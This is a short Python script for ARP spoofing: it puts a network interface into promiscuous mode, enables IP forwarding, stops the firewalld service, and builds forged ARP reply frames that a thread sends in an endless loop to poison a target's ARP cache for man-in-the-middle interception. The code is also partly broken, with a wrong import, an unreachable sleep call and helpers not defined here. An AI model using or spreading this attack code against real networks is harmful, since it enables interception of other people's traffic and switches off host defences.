# coding: = UTF-8

from number import *
import os
import time
import threading

nic = "ens33"

ETH_P_ALL = 0x0003 
ARP_TYPE = b"\x08\x06"
IPV4_TYPE = b"\x08\x00"
ARP_REQUEST = b"\x00\x01"
ARP_RESPONSE = b"\x00\x02"

def init_socket(nic):
	os.system('ip link set {} promisc on'.format(nic))
	os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
	os.system("systemctl stop firewalld")

	s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,socket.htons(ETH_P_ALL))
	s.bind((nic,0))
	return s

def check_arp(packet):
	eth_header = packet[0:14]
	_type = eth_header[12:14]
	if _type == ARP_TYPE:
		return True

	return False

def parse_arp(packet):
	eth_header = packet[0:14]
	dmac = eth_header[0:6]
	smac = eth_header[6:12]

	return {
		"smac": smac,
		"dmac": dmac	
	}
def construct_arp_comment(sip, smac, dip, dmac,opcode):
	eth_header = convert_mac(dmac) + convert_mac(smac) + ARP_TYPE
	hardware_type = b"\x00\x01"
	protocol_type = b"\x08\x00"
	hardware_size = b"\x06"
	protocol_size = b"\x04"

	bytes_smac = convert_mac(smac)
	bytes_sip = convert_ip(sip)
	bytes_dmac = convert_mac(dmac)
	bytes_dip = convert_ip(dip)

	arp_comment = eth_header + hardware_type + \
  protocol_type + hardware_size + protocol_size + opcode +  \
 bytes_smac + bytes_sip + bytes_dmac + bytes_dip 

	return arp_comment


def task_arp_spoof(s,sip,smac,dip,dmac):
	arp_comment = construct_arp_comment(sip , smac, dip,dmac,ARP_RESPONSE)
	while True :
		s.send(arp_comment)	
	time.sleep(1)


def arp_spoof(s,sip,smac,dip,dmac):
	arp_spoof_th = threading.Thread(
		target = task_arp_spoof,args = (s,sip,smac,dip,dmac))
	arp_spoof_th.start()
	print("arpspoof %s" %(dip))

